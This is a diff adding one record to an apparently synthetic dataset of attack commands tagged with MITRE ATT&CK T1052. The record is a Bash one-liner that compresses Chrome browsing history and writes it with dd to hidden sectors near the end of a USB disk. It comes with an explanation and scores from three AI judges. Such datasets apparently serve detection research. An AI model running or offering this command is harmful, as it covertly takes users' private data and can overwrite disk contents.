@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1052",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "gzip -c \"$HOME/.config/google-chrome/Default/History\" 2>/dev/null | dd of=\"/dev/sdb\" bs=1M seek=$(( $(blockdev --getsz /dev/sdb) / 2048 - 8 )) conv=notrunc,fsync status=none",
+  "explanation": "Compresses the Chrome history database and writes it near the end of the USB disk with a MiB-aligned seek, reducing likelihood of overwriting partition metadata.",
+  "rationale_steps": [
+    "Compress a browser history database if present",
+    "Compute an end-of-disk seek in 1 MiB units using total sector count",
+    "Write the stream into late disk sectors using dd with notrunc and fsync"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-4585860b-7026c61e",
+  "source_prompt_hash": "4585860b",
+  "timestamp_utc": "2025-09-30T05:09:05.177002Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and arithmetic expansion with valid gzip, dd, and redirection options in a proper pipeline.",
+        "semantic_score": 4,
+        "semantic_justification": "It compresses and writes the Chrome History file to a near-end offset on a block device consistent with exfiltration to physical media, but typically requires elevated privileges and risks overwriting existing data/metadata.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T07:16:51.532789Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid flags, correct arithmetic expansion, and appropriate command piping.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1052 by compressing Chrome browser history and writing it to a physical USB device (/dev/sdb) in a covert manner by placing it in an unused area near the end of the device.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T07:16:54.149245Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags, correct pipe usage, and proper arithmetic and command substitutions.",
+        "semantic_score": 3,
+        "semantic_justification": "The command's actions perfectly align with Exfiltration Over Physical Medium (T1052) by compressing and writing data to a raw disk offset, but it is not operationally plausible under the stated 'Privilege: None' as writing to /dev/sdb typically requires root access.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T07:17:12.150317Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
